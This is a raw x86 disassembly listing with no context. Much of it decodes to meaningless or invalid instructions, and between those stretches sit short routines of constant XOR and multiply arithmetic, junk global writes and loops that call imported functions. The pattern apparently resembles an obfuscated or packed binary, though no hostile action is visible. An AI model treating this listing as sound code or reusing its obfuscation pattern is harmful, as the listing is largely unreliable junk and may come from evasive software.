  40423b:	stos   DWORD PTR es:[edi],eax
  40423c:	lods   eax,DWORD PTR ds:[esi]
  40423d:	xchg   esp,eax
  40423e:	fisub  WORD PTR [eax+edx*2-0x67]
  404242:	rcl    DWORD PTR [ebp+0x1d],cl
  404245:	div    BYTE PTR [ecx+0x53]
  404248:	(bad)  
  404249:	sahf   
  40424a:	icebp  
  40424b:	dec    ebp
  40424c:	push   ecx
  40424d:	jne    0x40421e
  40424f:	xchg   esi,eax
  404250:	or     DWORD PTR [edi+edx*4],edi
  404253:	ror    ah,cl
  404255:	test   eax,0x6f568e26
  40425a:	jmp    0x4041fb
  40425c:	mov    bh,0x9e
  40425e:	imul   edx,DWORD PTR [ecx-0x44e3b221],0x16
  404265:	mov    eax,0x44d67523
  40426a:	cdq    
  40426b:	mov    ds:0xe5d4301e,al
  404270:	and    eax,0x77a2e991
  404275:	push   ds
  404276:	jnp    0x40420d
  404278:	add    BYTE PTR [ebp+0x7e09889],cl
  40427e:	mov    al,ds:0x825a3d6f
  404283:	jp     0x404241
  404285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404286:	pop    es
  404287:	xor    eax,0x851ab063
  40428c:	pop    ebp
  40428d:	dec    esp
  40428e:	jns    0x4042b9
  404290:	xchg   edi,eax
  404291:	js     0x40428f
  404293:	xchg   esi,eax
  404294:	xchg   ebx,eax
  404295:	shl    BYTE PTR [esp+edx*2],cl
  404298:	push   edi
  404299:	in     al,dx
  40429a:	or     eax,0x27c177d8
  40429f:	in     eax,dx
  4042a0:	or     eax,0xb65ff957
  4042a5:	shr    BYTE PTR [ecx+0x53e57582],cl
  4042ab:	xor    bh,BYTE PTR [ecx-0x793d239d]
  4042b1:	outs   dx,DWORD PTR ds:[esi]
  4042b2:	cmp    DWORD PTR [eax+edi*2+0x1df509e2],ebp
  4042b9:	push   ecx
  4042ba:	in     eax,dx
  4042bb:	mov    bl,0x6a
  4042bd:	(bad)  
  4042be:	jmp    0xaba8588f
  4042c3:	xor    BYTE PTR [edi],dl
  4042c5:	inc    esp
  4042c6:	xchg   esp,eax
  4042c7:	xor    DWORD PTR [edx],esi
  4042c9:	sahf   
  4042ca:	nop
  4042cb:	mov    dh,0xd4
  4042cd:	xchg   ecx,edi
  4042cf:	inc    ecx
  4042d0:	adc    al,0xf5
  4042d2:	hlt    
  4042d3:	xchg   BYTE PTR [eax+eiz*4],cl
  4042d6:	xor    al,0xc7
  4042d8:	pop    edi
  4042d9:	fcmovne st,st(6)
  4042db:	das    
  4042dc:	and    al,0x6b
  4042de:	add    edx,DWORD PTR [ebx+0x6dd82dc1]
  4042e4:	dec    esp
  4042e5:	(bad)  [edx+0x18]
  4042e8:	xor    eax,0x728e6f28
  4042ed:	jg     0x4042ee
  4042ef:	dec    esp
  4042f0:	cmp    bl,BYTE PTR [edi+0x55a18184]
  4042f6:	inc    ebx
  4042f7:	shr    DWORD PTR [edx],1
  4042f9:	(bad)
  4042fe:	addr16 jne 0x404357
  404301:	pop    edi
  404302:	sbb    esp,ebx
  404304:	clc    
  404305:	jmp    0x404330
  404307:	or     al,0x1
  404309:	int    0x25
  40430b:	jno    0x404329
  40430d:	xlat   BYTE PTR ds:[ebx]
  40430e:	xchg   BYTE PTR [ebp+0x3f],bh
  404311:	nop
  404312:	mov    bl,0x5
  404314:	scas   eax,DWORD PTR es:[edi]
  404315:	retf   0x342
  404318:	fs je  0x40429b
  40431b:	jge    0x40430c
  40431d:	inc    ebx
  40431e:	xchg   DWORD PTR [esi],edi
  404320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404321:	sub    ch,BYTE PTR [esi-0x64c67070]
  404327:	pop    esi
  404328:	sbb    bl,BYTE PTR [ecx+0x70fc1a94]
  40432e:	cmp    ch,BYTE PTR fs:[eax-0x62]
  404332:	lods   eax,DWORD PTR ds:[esi]
  404333:	test   ah,ch
  404335:	ins    BYTE PTR es:[edi],dx
  404336:	adc    dh,0xb6
  404339:	sar    DWORD PTR [eax+0x2d],0xd3
  40433d:	aad    0x48
  40433f:	add    DWORD PTR [eax],edx
  404341:	add    al,0x32
  404343:	mov    edi,0x6f79ec27
  404348:	or     eax,0x2abf0fd4
  40434d:	sub    eax,0x3a49c1aa
  404352:	adc    al,0x7c
  404354:	pop    ebp
  404355:	jge    0x404347
  404357:	(bad)  
  404358:	mov    bl,0x7e
  40435a:	pop    es
  40435b:	xlat   BYTE PTR ds:[ebx]
  40435c:	gs push es
  40435e:	fisubr DWORD PTR [edi-0x1c617bc7]
  404364:	or     eax,0x1f58c244
  404369:	adc    BYTE PTR [ecx],ch
  40436b:	rcl    BYTE PTR ds:[ecx+0x4d],cl
  40436f:	ror    bl,1
  404371:	pop    ss
  404372:	aad    0x16
  404374:	pop    ds
  404375:	int    0x54
  404377:	mov    eax,0x5ed808e9
  40437c:	sbb    dh,BYTE PTR [edi+0x12]
  40437f:	clc    
  404380:	shl    DWORD PTR [ecx],cl
  404382:	out    0x7b,eax
  404384:	sub    ebx,DWORD PTR [eax]
  404386:	add    BYTE PTR [eax],al
  404388:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40438f:	mov    eax,DWORD PTR [ebp-0x4]
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42ec6f,0x42e640
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ec67,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x4302b5,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42ec6f,0x4302b5
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x43035f,0x42e648
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e64c,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ec63,0x42ec6b
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42ec6b,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x4302cd,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	mov    ebx,0xfd2506f9
  404431:	sbb    DWORD PTR [esi+0x7e],edi
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x404403
  404439:	sub    al,0xd9
  40443b:	iret   
  40443c:	test   BYTE PTR [edx+ecx*4+0x17b3d2fb],bl
  404443:	lds    ebx,FWORD PTR [edx]
  404445:	jl     0x404487
  404447:	out    dx,al
  404448:	dec    ecx
  404449:	gs dec edx
  40444b:	aaa    
  40444c:	jmp    0x404493
  40444e:	sbb    dl,bl
  404450:	inc    ebx
  404451:	mov    edx,0x6f33954e
  404456:	cld    
  404457:	mov    esi,0x64a503c6
  40445c:	pop    ebp
  40445d:	cld    
  40445e:	jns    0x4044b1
  404460:	push   esp
  404461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404462:	jge    0x40445f
  404464:	cmp    edx,0x12a52a50
  40446a:	push   edi
  40446b:	and    dh,al
  40446d:	addr16 ret 
  40446f:	pop    esp
  404470:	ret    0xcbfa
  404473:	xor    al,ah
  404475:	sub    ebp,ebx
  404477:	xor    al,0x47
  404479:	in     al,dx
  40447a:	xchg   BYTE PTR [esi],ah
  40447c:	inc    ebp
  40447d:	jno    0x40445f
  40447f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404480:	push   cs
  404481:	xor    ch,BYTE PTR [ebx-0x2b]
  404484:	sar    BYTE PTR [ecx-0x6b],1
  404487:	popf   
  404488:	(bad)  
  404489:	les    esp,FWORD PTR [ecx+0x24]
  40448c:	out    dx,al
  40448d:	and    BYTE PTR [edi+0x526503d0],bh
  404493:	iret   
  404494:	jmp    0x6ad55535
  404499:	push   esp
  40449a:	(bad)  
  40449b:	loopne 0x404516
  40449d:	mov    edx,0x94802915
  4044a2:	loop   0x404435
  4044a4:	and    ebx,edi
  4044a6:	loop   0x4044ce
  4044a8:	ins    DWORD PTR es:[edi],dx
  4044a9:	mov    ebx,0xf2eec1d5
  4044ae:	mov    ebx,0x32299e55
  4044b3:	or     al,0xe8
  4044b5:	jecxz  0x404478
  4044b7:	or     DWORD PTR [edi+0x917242c],ecx
  4044bd:	arpl   WORD PTR [ebp+0x54cadea9],dx
  4044c3:	ror    BYTE PTR [esi-0x55f85058],0xff
  4044ca:	enter  0x6ce2,0x2
  4044ce:	or     ah,al
  4044d0:	jge    0x404518
  4044d2:	sar    BYTE PTR [esi],0x2c
  4044d5:	pop    es
  4044d6:	xor    DWORD PTR [ebx],edx
  4044d8:	les    edi,FWORD PTR [edi+0x44]
  4044db:	and    dl,BYTE PTR [eax-0x728bfe28]
  4044e1:	jae    0x404479
  4044e3:	lock push esi
  4044e5:	push   esp
  4044e6:	cdq    
  4044e7:	stos   DWORD PTR es:[edi],eax
  4044e8:	outs   dx,DWORD PTR ds:[esi]
  4044e9:	or     al,0x9a
  4044eb:	sahf   
  4044ec:	repnz push esp
  4044ee:	sti    
  4044ef:	mov    eax,0x94a483af
  4044f4:	mov    eax,0xd651b33
  4044f9:	sahf   
  4044fa:	retf   
  4044fb:	or     bl,bl
  4044fd:	mov    edi,0x197ce9bd
  404502:	xchg   ebp,eax
  404503:	pop    ecx
  404504:	(bad)  
  404505:	push   ds
  404506:	aas    
  404507:	jge    0x40456e
  404509:	outs   dx,BYTE PTR ds:[esi]
  40450a:	sbb    al,0xd3
  40450c:	cld    
  40450d:	into   
  40450e:	cmp    DWORD PTR [ecx],0xffffffb0
  404511:	fwait
  404512:	outs   dx,BYTE PTR ds:[esi]
  404513:	push   cs
  404514:	push   0x1da6afe5
  404519:	scas   eax,DWORD PTR es:[edi]
  40451a:	popa   
  40451b:	sub    eax,0x27be7a40
  404520:	es push eax
  404522:	push   DWORD PTR [esp+edi*4]
  404525:	mov    DWORD PTR [edx-0x79759a3d],esi
  40452b:	cld    
  40452c:	push   ebx
  40452d:	pop    ds
  40452e:	mov    ch,0x50
  404530:	or     al,0x46
  404532:	sub    BYTE PTR [eax-0xc],bl
  404535:	(bad)  
  404536:	xor    dh,BYTE PTR [edx+0x2ad814a0]
  40453c:	dec    ebp
  40453d:	mov    eax,ds:0x5725d37f
  404542:	mov    edi,DWORD PTR [ecx+0x449e421f]
  404548:	cmp    eax,0x76fdd845
  40454d:	push   edx
  40454e:	ror    DWORD PTR [ecx+0x16],0xdf
  404552:	idiv   DWORD PTR [esp+eiz*4-0x41]
  404556:	jns    0x4045a5
  404558:	push   es
  404559:	arpl   WORD PTR [ebx],dx
  40455b:	ret    
  40455c:	xchg   edi,eax
  40455d:	jo     0x4044df
  40455f:	and    BYTE PTR [ecx],ch
  404561:	push   es
  404562:	js     0x404537
  404564:	fistp  DWORD PTR [esi]
  404566:	inc    edi
  404567:	test   al,0x1
  404569:	fsubr  QWORD PTR [esp+ebx*2-0x50]
  40456d:	(bad)  
  40456e:	lods   eax,DWORD PTR ds:[esi]
  40456f:	jmp    0x6d01:0xe3a8cf5c
  404576:	inc    edx
  404577:	inc    bl
  404579:	xor    eax,0xf7eb32e9
  40457e:	rol    BYTE PTR [ebx],0x9c
  404581:	push   0x30
  404583:	mov    esp,0x3baaa964
  404588:	cli    
  404589:	jmp    0x7424:0xf50bfe19
  404590:	xor    ch,ch
  404592:	(bad)  
  404593:	ins    BYTE PTR es:[edi],dx
  404594:	cmp    al,0x16
  404596:	in     al,dx
  404597:	mov    eax,0x7e6bf80d
  40459c:	fist   WORD PTR [edx-0x27]
  40459f:	push   edx
  4045a0:	lock repz ja 0x404535
  4045a4:	dec    ebp
  4045a5:	popa   
  4045a6:	ror    BYTE PTR [ecx],1
  4045a8:	lahf   
  4045a9:	push   0x746f7f74
  4045ae:	out    dx,eax
  4045af:	jbe    0x4045de
  4045b1:	sbb    bh,BYTE PTR [edx]
  4045b3:	inc    edi
  4045b4:	push   cs
  4045b5:	shl    BYTE PTR [ebx+0x502e4966],0xde
  4045bc:	lods   eax,DWORD PTR ds:[esi]
  4045bd:	pop    eax
  4045be:	mov    ds:0x8c40dab4,al
  4045c3:	dec    esp
  4045c4:	test   eax,0x56caae9e
  4045c9:	and    DWORD PTR [ebx+0x57e6e6ed],edx
  4045cf:	(bad)  
  4045d0:	mov    ecx,0x771b8eaf
  4045d5:	mov    bl,0xfe
  4045d7:	fwait
  4045d8:	push   0xfffffffd
  4045da:	stc    
  4045db:	sbb    ebp,DWORD PTR [esi]
  4045dd:	aam    0x70
  4045df:	add    eax,ecx
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x430367,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x4302b9,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x4302b9
  40460c:	inc    eax
  40460d:	mov    ds:0x4302b9,eax
  404612:	cmp    DWORD PTR ds:0x4302b9,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x4302b9,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ea93
  404650:	cmp    DWORD PTR ds:0x4302b9,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x4302b9
  404662:	inc    eax
  404663:	mov    ds:0x4302b9,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42ec53,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x4302b9,0x4302f1
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x4302dd,0x42ec5b
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x404688
  4046fa:	mov    BYTE PTR [esi+0x72],0x24
  4046fe:	daa    
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x4046a2
  404706:	js     0x4046a9
  404708:	jnp    0x4046a9
  40470a:	adc    DWORD PTR [eax],ebp
  40470c:	inc    esi
  40470d:	jmp    0x38f6:0x46cb6e74
  404714:	or     al,0xee
  404716:	sbb    DWORD PTR [edi],0x15
  404719:	inc    ebx
  40471a:	mov    BYTE PTR [edi-0x5dd1169c],al
  404720:	(bad)  
  404721:	xor    edi,DWORD PTR ds:0xeac64380
  404727:	neg    BYTE PTR [ebx-0x2c]
  40472a:	cld    
  40472b:	push   esi
  40472c:	mov    eax,ds:0xe2f73f83
  404731:	sbb    BYTE PTR [eax+0x6f17bfca],bh
  404737:	add    al,dl
  404739:	jno    0x40470c
  40473b:	mov    al,0x2
  40473d:	scas   al,BYTE PTR es:[edi]
  40473e:	inc    edi
  40473f:	push   edx
  404740:	retf   
  404741:	das    
  404742:	jp     0x404792
  404744:	sub    dl,al
  404746:	outs   dx,DWORD PTR ds:[esi]
  404747:	push   edx
  404748:	icebp  
  404749:	in     al,0x7b
  40474b:	jo     0x404744
  40474d:	aad    0x63
  40474f:	fimul  DWORD PTR [ebp+0x409f0d38]
  404755:	ret    
  404756:	popa   
  404757:	fsub   QWORD PTR [edx]
  404759:	jne    0x404740
  40475b:	mov    cl,0xf0
  40475d:	(bad)  
  40475e:	scas   al,BYTE PTR es:[edi]
  40475f:	pop    ecx
  404760:	jns    0x404716
  404762:	mov    edx,0xf58e9f27
  404767:	dec    BYTE PTR [ebp-0x3a]
  40476a:	or     BYTE PTR [ebp+0x5cc10e9e],ah
  404770:	cmp    BYTE PTR [ebp-0x60],bh
  404773:	sub    ecx,esp
  404775:	sbb    BYTE PTR [edx+eax*8-0x1d8da832],bl
  40477c:	push   edx
  40477d:	dec    eax
  40477e:	pop    ds
  40477f:	aam    0x6a
  404781:	mov    edi,0x2d989421
  404786:	fdiv   DWORD PTR [ecx-0x21]
  404789:	arpl   WORD PTR [edi],cx
  40478b:	iret   
  40478c:	imul   esi,DWORD PTR [esi+0x704ccb66],0xcb3a93c3
  404796:	cmp    ch,ah
  404798:	cmc    
  404799:	ss int 0xee
  40479c:	pop    ss
  40479d:	loop   0x4047b1
  40479f:	mov    eax,ds:0x26899189
  4047a4:	aam    0xb3
  4047a6:	fnstsw WORD PTR [edi+0x6]
  4047a9:	or     BYTE PTR [eax],0xc0
  4047ac:	out    dx,eax
  4047ad:	dec    esp
  4047ae:	and    DWORD PTR [ecx],eax
  4047b0:	nop
  4047b1:	jl     0x40481c
  4047b3:	mov    cl,0xee
  4047b5:	adc    ah,BYTE PTR [eax]
  4047b7:	jmp    0x784ab07b
  4047bc:	xchg   DWORD PTR [ebp+0x3f],esi
  4047bf:	push   eax
  4047c0:	push   es
  4047c1:	jbe    0x404804
  4047c3:	cmp    ebx,edi
  4047c5:	in     eax,0x60
  4047c7:	sub    al,0x4
  4047c9:	dec    ebp
  4047ca:	pop    ss
  4047cb:	sub    bh,BYTE PTR [ecx+0x6558cdd8]
  4047d1:	push   fs
  4047d3:	pop    esp
  4047d4:	fs inc edi
  4047d6:	fstp   TBYTE PTR [eax]
  4047d8:	add    esp,ecx
  4047da:	out    dx,eax
  4047db:	push   esi
  4047dc:	push   ecx
  4047dd:	inc    edx
  4047de:	fwait
  4047df:	into   
  4047e0:	out    0xe4,eax
  4047e2:	pop    esi
  4047e3:	mov    ecx,0xae0424fc
  4047e8:	dec    esi
  4047e9:	pop    edi
  4047ea:	test   al,0xcb
  4047ec:	sti    
  4047ed:	sbb    ebp,eax
  4047ef:	aaa    
  4047f0:	scas   eax,DWORD PTR es:[edi]
  4047f1:	jge    0x4047e3
  4047f3:	add    eax,0xb3b0e936
  4047f8:	es sahf 
  4047fa:	in     eax,0x82
  4047fc:	stc    
  4047fd:	pop    edi
  4047fe:	stc    
  4047ff:	retf   0xd161
  404802:	and    ecx,DWORD PTR [esi-0x71]
  404805:	shr    DWORD PTR [ecx-0x4c330c60],0x54
  40480c:	inc    esp
  40480d:	pop    eax
  40480e:	rcr    BYTE PTR [eax],1
  404810:	clc    
  404811:	(bad)  [edx+0x46]
  404814:	sub    ebp,DWORD PTR [eax-0x2d5e0186]
  40481a:	push   cs
  40481b:	or     BYTE PTR [edx-0x2a],bl
  40481e:	push   0xd325e191
  404823:	call   0xc41a:0x7fb6edd3
  40482a:	adc    ebp,DWORD PTR [ebx+0x3b]
  40482d:	add    DWORD PTR [eax],edx
  40482f:	ds dec eax
  404831:	fisttp DWORD PTR [ebp+0x65]
  404834:	or     al,BYTE PTR [ecx-0x6f6ded1f]
  40483a:	pop    esp
  40483b:	sahf   
  40483c:	push   0xfffffffd
  40483e:	sub    sp,0xeab1
  404843:	ret    
  404844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404845:	popf   
  404846:	mov    bh,0xcf
  404848:	jnp    0x404870
  40484a:	mov    WORD PTR [edx],ss
  40484c:	cld    
  40484d:	aad    0x66
  40484f:	jecxz  0x40483d
  404851:	mov    eax,0xd1b9753c
  404856:	outs   dx,BYTE PTR ds:[esi]
  404857:	ret    0x95f6
  40485a:	push   eax
  40485b:	lods   al,BYTE PTR ds:[esi]
  40485c:	ret    
  40485d:	sbb    eax,0x5c2d38e5
  404862:	fcomip st,st(3)
  404864:	shr    ch,1
  404866:	inc    esp
  404867:	inc    ebp
  404868:	push   ecx
  404869:	jns    0x4048e7
  40486b:	int3   
  40486c:	popf   
  40486d:	into   
  40486e:	push   edx
  40486f:	mov    bh,0xa4
  404871:	cmp    dl,bh
  404873:	arpl   bx,bx
  404875:	inc    BYTE PTR [edi-0x7e]
  404878:	retf   0xaf6
  40487b:	dec    BYTE PTR [ebx]
  40487d:	sar    esp,cl
  40487f:	loopne 0x4048fd
  404881:	int3   
  404882:	or     DWORD PTR ds:0x402dad9f,0x1f
  404889:	mov    eax,0x8021df73
  40488e:	icebp  
  40488f:	pushf  
  404890:	pop    ebx
  404891:	cmp    ah,bh
  404893:	xchg   ecx,eax
  404894:	jp     0x40481d
  404896:	repz inc ebp
  404898:	out    dx,al
  404899:	xchg   BYTE PTR [edx+ebx*2-0x7f48e879],ch
  4048a0:	cmp    edi,eax
  4048a2:	mov    bl,BYTE PTR [ecx+0x48]
  4048a5:	dec    ebx
  4048a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048a7:	xor    al,0x6a
  4048a9:	mov    ah,0xd
  4048ab:	jle    0x404898
  4048ad:	test   al,0x2b
  4048af:	cmp    BYTE PTR [ecx],ah
  4048b1:	mov    edi,0xd7b61919
  4048b6:	xor    BYTE PTR [eax+0x6e],dh
  4048b9:	jno    0x4048bf
  4048bb:	aam    0xbe
  4048bd:	sub    DWORD PTR [edi+0x1a4bdfb0],ebp
  4048c3:	out    0xc7,al
  4048c5:	pop    edi
  4048c6:	rcl    BYTE PTR [esi],1
  4048c8:	jle    0x404888
  4048ca:	nop
  4048cb:	pop    esi
  4048cc:	xchg   esp,eax
  4048cd:	pop    esi
  4048ce:	jmp    0x4abc4346
  4048d3:	sbb    eax,0x341e2498
  4048d8:	jns    0x404922
  4048da:	inc    edi
  4048db:	and    DWORD PTR [edi+ebx*8],ebx
  4048de:	mov    ah,0x8b
  4048e0:	std    
  4048e1:	sahf   
  4048e2:	dec    eax
  4048e3:	inc    esp
  4048e4:	shl    BYTE PTR [ebp+0x564dcbc6],0x27
  4048eb:	add    edi,ebp
  4048ed:	mov    al,ds:0xebf629b6
  4048f2:	xor    al,0xb5
  4048f4:	adc    edx,eax
  4048f6:	jmp    0x9ace:0x73f0465c
  4048fd:	icebp  
  4048fe:	lds    edx,FWORD PTR [esi+0x6e17b5c3]
  404904:	push   ss
  404905:	or     eax,0x83254b25
  40490a:	shl    DWORD PTR ds:0x34aac987,0x86
  404911:	ficom  DWORD PTR [edx+0x5a]
  404914:	pop    ecx
  404915:	add    BYTE PTR [ebx],bl
  404917:	test   eax,0x317f6891
  40491c:	dec    ecx
  40491d:	arpl   WORD PTR [eax-0x2b60d4b5],si
  404923:	sub    DWORD PTR [ecx-0x11d2b93e],ebx
  404929:	sub    al,0x54
  40492b:	mov    bh,0xa3
  40492d:	popa   
  40492e:	and    dl,BYTE PTR [esp+edi*1]
  404931:	mov    ebx,0x12eb227
  404936:	mov    ch,BYTE PTR [edx+0x2a]
  404939:	div    DWORD PTR [ebp-0x54]
  40493c:	je     0x404926
  40493e:	sub    bh,BYTE PTR [ebx+0x3b]
  404941:	ror    ch,cl
  404943:	mov    bl,0xb9
  404945:	pop    ds
  404946:	push   ebx
  404947:	xchg   ebp,eax
  404948:	dec    eax
  404949:	test   ah,dl
  40494b:	dec    edx
  40494c:	mov    edi,0x61667ed1
  404951:	retf   0x8980
  404954:	les    esp,FWORD PTR [ebx]
  404956:	and    esi,ecx
  404958:	add    DWORD PTR [ebp+0x6320ec80],eax
  40495e:	test   esi,ecx
  404960:	lods   al,BYTE PTR ds:[esi]
  404961:	jne    0x4049db
  404963:	push   esp
  404964:	(bad)  
  404965:	mov    dl,0xf0
  404967:	cmp    DWORD PTR [edx],edx
  404969:	push   0x19dc71f7
  40496e:	aaa    
  40496f:	sbb    ebx,ebp
  404971:	cli    
  404972:	sbb    BYTE PTR [ecx],0x11
  404975:	lods   eax,DWORD PTR ds:[esi]
  404976:	xor    eax,DWORD PTR [eax]
  404978:	imul   esp,DWORD PTR [edx-0x7c],0x203321b1
  40497f:	lds    ebp,FWORD PTR [edx-0x59]
  404982:	sbb    BYTE PTR ds:0x9228dcd8,0x9c
  404989:	arpl   WORD PTR [edx-0xb68ffb5],cx
  40498f:	fldenv [ebx-0x23d0b56]
  404995:	jl     0x404a07
  404997:	out    0xf4,al
  404999:	xor    esi,DWORD PTR [ebx+0xd]
  40499c:	or     eax,0x17214cc0
  4049a1:	lea    ebx,[ebx-0x1b]
  4049a4:	mov    DWORD PTR [edx],eax
  4049a6:	and    DWORD PTR ds:0x42e658,0x0
  4049b0:	xor    edx,edx
  4049b2:	xor    edx,DWORD PTR ds:0x42e658
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e658,edx
  4049bf:	cmp    DWORD PTR ds:0x42e658,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e84f
  4049da:	cmp    DWORD PTR ds:0x42e658,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e658
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e658,edx
  4049f4:	cmp    DWORD PTR ds:0x42e658,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42ec6b,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x43034f,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ec67,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x430363,0x43035f
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ec67,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x43035b
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	call   0x47a38738
  404a90:	and    eax,0x7c917e7e
  404a95:	jle    0x404b15
  404a97:	xchg   ecx,eax
  404a98:	adc    eax,0x9237ad4a
  404a9d:	mov    WORD PTR [edx-0x5b25f3f3],fs
  404aa3:	inc    esp
  404aa4:	mov    esi,0xb570cf1
  404aa9:	aam    0x1f
  404aab:	push   edi
  404aac:	mov    ecx,?
  404aae:	inc    ebx
  404aaf:	repnz gs test dh,ch
  404ab3:	add    DWORD PTR [ebp+0x2d81c7d8],esi
  404ab9:	rol    BYTE PTR [edi-0x2d],0xaf
  404abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404abe:	or     edx,DWORD PTR [edi]
  404ac0:	xchg   DWORD PTR [ebp-0x2ef360ac],eax
  404ac6:	repz mov dl,0xc4
  404ac9:	mov    ds:0xcae82456,eax
  404ace:	mov    dh,0x5
  404ad0:	gs scas eax,DWORD PTR es:[edi]
  404ad2:	in     eax,0x66
  404ad4:	aas    
